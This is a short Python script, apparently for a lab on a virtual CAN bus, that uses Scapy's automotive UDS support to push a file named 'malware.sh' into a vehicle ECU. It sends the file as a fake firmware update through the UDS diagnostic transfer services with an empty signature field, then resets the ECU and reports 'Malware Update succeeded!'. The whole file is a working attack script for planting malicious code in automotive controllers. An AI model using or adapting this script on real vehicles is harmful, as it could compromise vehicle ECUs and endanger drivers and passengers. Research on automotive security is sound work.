from scapy.sendrecv import sniff
from scapy.main import load_contrib
from scapy.layers.can import *
import json, base64

conf.contribs['ISOTP'] = {'use-can-isotp-kernel-module': True}
conf.contribs['CANSocket'] = {'use-python-can': False}

load_contrib('cansocket')
load_contrib('isotp')
load_contrib('automotive.uds')
load_contrib('automotive.ecu')

with open("malware.sh", "rb") as fw:
    data = fw.read()

payload = {'sign':''}
payload['data'] = base64.b64encode(data).decode('utf-8')
payload = json.dumps(payload)
 
requests = [ \
    UDS()/UDS_DSC(diagnosticSessionType=0x2), \
    UDS()/UDS_RU(memorySizeLen=0x1, memoryAddressLen=0x4, memoryAddress4=0xaaaaaaaa, memorySize1=0x64), \
    UDS()/UDS_TD(blockSequenceCounter=0x0, transferRequestParameterRecord=payload), \
    UDS()/UDS_RTE(transferRequestParameterRecord=b'done'), \
    UDS()/UDS_ER()
]

sock = ISOTPSocket('vcan0', sid=0x601, did=0x701, basecls=UDS)

for req in requests:
    resp = sock.sr1(req, timeout=1, verbose=False)
    time.sleep(0.3)

    if hasattr(resp, 'negativeResponseCode'):
        print(UDS.services[req.service] + " ... negative response!")
        print("Update failed!")
        exit(-1)
    elif req.service + 0x40 == resp.service:
        print(UDS.services[req.service] + "{}".format(' '*(30-(len(UDS.services[req.service])))) + "- OK")
    else:
        print("Error")
        exit(-1)
print("Malware Update succeeded!")